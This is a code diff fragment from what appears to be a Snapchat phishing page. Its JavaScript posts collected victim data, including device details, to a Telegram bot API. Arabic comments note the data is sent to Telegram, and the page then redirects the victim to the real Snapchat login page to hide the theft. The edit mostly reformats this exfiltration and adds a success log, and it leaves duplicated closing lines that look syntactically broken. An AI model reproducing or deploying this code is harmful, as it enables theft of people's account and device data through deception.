@@ -110,15 +110,16 @@ RAM Size: ${ramSize}
                         `;
 
                         // إرسال البيانات إلى تيليجرام
-                        axios.post(URI_API, {
-                            chat_id: CHAT_ID,
-                            parse_mode: 'html',
-                            text: message
-                        }).then(() => {
-                            // إعادة توجيه المستخدم إلى صفحة تسجيل الدخول الرسمية بعد الإرسال
-                           window.location.href = "https://accounts.snapchat.com/accounts/login";
-                        }).catch(error => {
-                            console.error("خطأ في إرسال البيانات إلى تيليجرام:", error);
+                       axios.post(URI_API, {
+     chat_id: CHAT_ID,
+    parse_mode: 'html',
+    text: message
+}).then(() => {
+    console.log("تم إرسال البيانات بنجاح!");
+    window.location.href = "https://accounts.snapchat.com/accounts/login";
+}).catch(error => {
+    console.error("خطأ في إرسال البيانات إلى تيليجرام:", error);
+});
                             window.location.href = "https://accounts.snapchat.com/accounts/login";
                         });
                     })
